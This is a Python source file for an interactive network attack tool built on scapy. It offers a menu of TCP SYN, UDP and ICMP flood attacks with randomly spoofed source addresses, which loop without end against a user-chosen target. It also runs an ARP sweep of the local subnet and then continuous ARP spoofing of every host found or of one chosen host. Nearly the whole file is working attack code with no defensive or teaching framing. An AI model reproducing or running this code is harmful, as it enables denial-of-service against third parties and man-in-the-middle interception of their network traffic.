import socket
from time import sleep
from random import randrange
from scapy.all import *
"""
arp -a
route print
nmap -v -sn 192.168.1.1/24
"""


def fakeSourceIPgenerates():
    # these values are not valid for first octet of IP address
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]

    first = randrange(1, 256)
    while first in not_valid:
        first = randrange(1, 256)

    IPaddr = ".".join([
        str(first),
        str(randrange(1, 256)),
        str(randrange(1, 256)),
        str(randrange(1, 256))
    ])
    return IPaddr


def fakeSourcePortgenerates():
    return randrange(1, 1024)


def domainToIPaddress(domainName="www.google.com"):
    domainIP = socket.gethostbyname(domainName)
    print(str(domainName) + "'s IP : " + str(domainIP))
    return domainIP


def packetPrint(i, packet):
    if i == 1:
        packet.show()
    elif i == 2:
        print(repr(packet))
    return


def TCPSYNFloodAttack(dst_ip, dst_port, iface):
    # create packet
    src_ip = fakeSourceIPgenerates()
    src_port = fakeSourcePortgenerates()
    packet_ip = IP(dst=dst_ip, src=src_ip)
    packet_tcp = TCP(dport=dst_port, sport=src_port, flags='S')
    packet = packet_ip / packet_tcp
    # Send packets at layer 3
    send(packet, iface=iface, verbose=0)
    return


def UDPFloodAttack(dst_ip, dst_port, iface):
    # create packet
    src_ip = fakeSourceIPgenerates()
    src_port = fakeSourcePortgenerates()
    packet_ether = Ether()
    packet_ip = IP(dst=dst_ip, src=src_ip)
    packet_udp = UDP(dport=dst_port, sport=src_port)
    packet = packet_ether / packet_ip / packet_udp
    # Send packets at layer 2
    sendp(packet, iface=iface, verbose=0)
    return


def ICMPFloodAttack(dst_ip, iface):
    # create packet
    src_ip = fakeSourceIPgenerates()
    packet_ip = IP(dst=dst_ip, src=src_ip)
    packet_icmp = ICMP()
    payload = 'A' * 1000
    packet = packet_ip / packet_icmp / payload
    # Send packets at layer 3
    send(packet, iface=iface, verbose=0)
    return


def ARPPing(gateway_ip, mesk, iface):
    # create packet
    packet_ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    IPmesk = gateway_ip + '/' + str(mesk)
    packet_arp = ARP(pdst=IPmesk)
    packet = packet_ether / packet_arp
    # Send and receive packets at layer 2
    ans, unans = srp(packet, iface=iface, type=ETH_P_ARP, timeout=2, verbose=0)
    result = []
    for sent, received in ans:
        if str(received.psrc) != gateway_ip:
            result.append(received.psrc)
    return result


def ARPSpoofingAttack(gateway_mac, target_mac, gateway_ip, target_ip, iface):
    # create packet 1
    packet_1_ether = Ether(dst=target_mac)
    packet_1_arp = ARP(psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2)
    packet_1 = packet_1_ether / packet_1_arp
    # create packet 2
    packet_2_ether = Ether(dst=gateway_mac)
    packet_2_arp = ARP(psrc=target_ip,
                       hwdst=gateway_mac,
                       pdst=gateway_ip,
                       op=2)
    packet_2 = packet_2_ether / packet_2_arp
    # Send packets at layer 2
    sendp(packet_1, iface=iface, verbose=0)
    # Send packets at layer 2
    sendp(packet_2, iface=iface, verbose=0)
    return


def ifaceChoose():
    ifList = get_windows_if_list()
    ifaceList = []
    for tmp in ifList:
        ifaceList.append(tmp['description'])
    return ifaceList


def inputIPCheck(outputString, i=0):
    IP, tmp = '0', True
    while tmp:
        print(outputString, end='')
        IP = input()
        if i == 1 and IP == '':
            return IP
        IPCheck = IP.split('.')
        try:
            IP = ''
            if len(IPCheck) == 4:
                for subIPCheck in IPCheck:
                    if int(subIPCheck) >= 0 and int(subIPCheck) <= 255:
                        IP = IP + '.' + str(int(subIPCheck))
                        tmp = False
                    else:
                        tmp = True
                        break
            else:
                tmp = True
        except:
            tmp = True
        IP = IP[1:]
        if tmp == False and getmacbyip(IP) == None:
            print(IP + ' is invalid or unreachable.')
            tmp = True
    return IP


def inputINTCheck(outputString, i=0):
    INT, tmp = -1, True
    while tmp:
        print(outputString, end='')
        INT = input()
        try:
            INT = int(INT)
            if i == -1 and INT >= 0 and INT <= 32:
                tmp = False
            elif i == 0 and INT >= 0 and INT <= 65535:
                tmp = False
            elif i != 0 and i != -1 and INT >= 0 and INT <= i:
                tmp = False
            else:
                tmp = True
        except:
            tmp = True
    return INT


def main():
    while True:
        counter = 0
        choose = input('\nPlease choose the attck way :\n' + '0.exit\n' +
                       '1.TCP SYN Flood\n' + '2.UDP Flood\n' +
                       '3.ICMP Flood\n' + '4.ARP Ping\n' + '5.ARP Spoofing\n')
        if choose == '0':
            exit()
        ifaceList = ifaceChoose()
        for i in range(len(ifaceList)):
            print(str(i) + '. ' + ifaceList[i])
        ifaceListChoose = inputINTCheck('iface Choose : ', len(ifaceList))
        if choose == '1':
            dstIP = inputIPCheck('dstIP : ')
            dstPort = inputINTCheck('dstPort : ')
            while True:
                try:
                    counter += 1
                    print('\rTCP SYN Flood : ' + str("%07d" % counter), end='')
                    TCPSYNFloodAttack(dstIP, dstPort,
                                      ifaceList[ifaceListChoose])
                except KeyboardInterrupt:
                    break
        elif choose == '2':
            dstIP = inputIPCheck('dstIP : ')
            dstPort = inputINTCheck('dstPort : ')
            while True:
                try:
                    counter += 1
                    print('\rUDP Flood : ' + str("%07d" % counter), end='')
                    UDPFloodAttack(dstIP, dstPort, ifaceList[ifaceListChoose])
                except KeyboardInterrupt:
                    break
        elif choose == '3':
            dstIP = inputIPCheck('dstIP : ')
            while True:
                try:
                    counter += 1
                    print('\rICMP Flood : ' + str("%07d" % counter), end='')
                    ICMPFloodAttack(dstIP, ifaceList[ifaceListChoose])
                except KeyboardInterrupt:
                    break
        elif choose == '4':
            gatewayIP = conf.route.route("0.0.0.0")[2]
            print('gatewayIP : ' + gatewayIP)
            maskSize = inputINTCheck('Mask Size : ', -1)
            targetIP = []
            tryTimes = inputINTCheck('Try Times : ', 9)
            for i in range(tryTimes + 1):
                tmp = ARPPing(gatewayIP, maskSize, ifaceList[ifaceListChoose])
                for tmpIP in tmp:
                    if tmpIP not in targetIP:
                        targetIP.append(tmpIP)
            gatewayMAC = getmacbyip(gatewayIP)
            targetMAC = []
            if len(targetIP) == 0:
                print('ARP Ping fail')
                continue
            for targetIP_ in targetIP:
                targetMAC.append(getmacbyip(targetIP_))
            print(targetIP)
            attack = input('Attack or not (Y/N) : ')
            if attack == 'Y':
                while True:
                    try:
                        for i in range(len(targetIP)):
                            counter += 1
                            print('\rARP Spoofing : ' + str("%07d" % counter),
                                  end='')
                            ARPSpoofingAttack(gatewayMAC, targetMAC[i],
                                              gatewayIP, targetIP[i],
                                              ifaceList[ifaceListChoose])
                            sleep(.1)
                    except KeyboardInterrupt:
                        break
        elif choose == '5':
            gatewayIP = conf.route.route("0.0.0.0")[2]
            targetIP = inputIPCheck('targetIP : ')
            gatewayMAC = getmacbyip(gatewayIP)
            targetMAC = getmacbyip(targetIP)
            while True:
                try:
                    counter += 1
                    print('\rARP Spoofing : ' + str("%07d" % counter), end='')
                    ARPSpoofingAttack(gatewayMAC, targetMAC, gatewayIP,
                                      targetIP, ifaceList[ifaceListChoose])
                    sleep(.1)
                except KeyboardInterrupt:
                    break


if __name__ == "__main__":
    main()
